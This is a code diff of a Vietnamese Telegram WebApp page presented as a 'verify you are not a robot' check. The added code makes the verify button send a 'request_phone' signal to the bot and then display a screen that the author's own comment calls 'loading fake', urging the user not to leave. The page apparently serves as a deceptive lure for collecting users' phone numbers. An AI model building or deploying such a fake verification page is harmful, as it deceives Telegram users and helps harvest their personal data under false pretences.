@@ -6,36 +6,17 @@
 
 <style>
 body {
-    margin:0;
-    font-family:sans-serif;
-    text-align:center;
+    font-family: sans-serif;
+    text-align: center;
+    margin-top: 100px;
 }
-
-/* loading full màn */
-#loading {
-    display:none;
-    position:fixed;
-    top:0;
-    left:0;
-    width:100%;
-    height:100%;
-    background:#fff;
-    justify-content:center;
-    align-items:center;
-    flex-direction:column;
-}
-
-.spinner {
-    width:40px;
-    height:40px;
-    border:5px solid #eee;
-    border-top:5px solid #2AABEE;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-}
-
-@keyframes spin {
-    100% { transform: rotate(360deg); }
+button {
+    padding: 15px 30px;
+    font-size: 18px;
+    border-radius: 12px;
+    border: none;
+    background: #2AABEE;
+    color: white;
 }
 </style>
 </head>
@@ -43,33 +24,26 @@ body {
 <body>
 
 <h2 id="title">🤖 Xác minh bạn không phải robot</h2>
-function requestPhone() {
-    Telegram.WebApp.sendData("request_phone");
 
-    document.body.innerHTML = `
-        <h2>Đợi đã, đừng đi ra ngoài</h2>
-        <p>⏳ Đang xác minh...</p>
-    `;
-}
+<button onclick="verify()">✅ Tôi không phải robot</button>
 
 <script>
-// nếu đã verify thì bỏ qua
 const params = new URLSearchParams(window.location.search);
+
+// nếu đã xác minh
 if (params.get("verified") === "1") {
     document.body.innerHTML = "✅ Xác minh thành công!";
 }
 
 function verify() {
-    document.querySelector("button").style.display = "none";
-    document.getElementById("loading").style.display = "flex";
+    // gửi yêu cầu về bot
+    Telegram.WebApp.sendData("request_phone");
 
-    setTimeout(() => {
-        Telegram.WebApp.close();
-
-        // chuyển bot
-        window.location.href = "https://t.me/YOUR_BOT?start=verify";
-
-    }, 1800);
+    // loading fake
+    document.body.innerHTML = `
+        <h3>Đợi đã, đừng đi ra ngoài</h3>
+        <p>⏳ Đang xác minh...</p>
+    `;
 }
 </script>
 
